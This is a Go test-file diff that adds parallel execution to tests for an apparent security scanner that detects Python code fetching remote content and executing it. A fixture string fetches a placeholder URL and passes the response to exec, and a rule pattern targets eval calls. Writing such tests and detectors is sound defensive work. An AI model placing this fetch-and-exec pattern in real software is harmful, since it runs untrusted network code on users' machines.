@@ -9,6 +9,7 @@ import (
 )
 
 func TestPythonRemoteFlow(t *testing.T) {
+	t.Parallel()
 	cases := []struct {
 		name, code string
 		want       bool
@@ -49,6 +50,7 @@ func TestPythonRemoteFlow(t *testing.T) {
 }
 
 func TestPythonRemoteFlowFixtureContext(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "fixtures/sample.py", "body = requests.get('https://example.invalid').text\nexec(body)\n")
 	_, findings := New(Options{}).Scan(context.Background(), root)
@@ -59,6 +61,7 @@ func TestPythonRemoteFlowFixtureContext(t *testing.T) {
 }
 
 func TestPythonRemoteFlowBound(t *testing.T) {
+	t.Parallel()
 	root := t.TempDir()
 	writeFixture(t, root, "sample.py", "# requests\n"+strings.Repeat("#", pythonFlowMaxSource))
 	rule := Rule{ID: "CUSTOM-001", Category: "dynamic-execution", Severity: model.SeverityHigh, Confidence: model.ConfidenceMedium, Description: "Dynamic evaluation", Pattern: `\beval\(`}
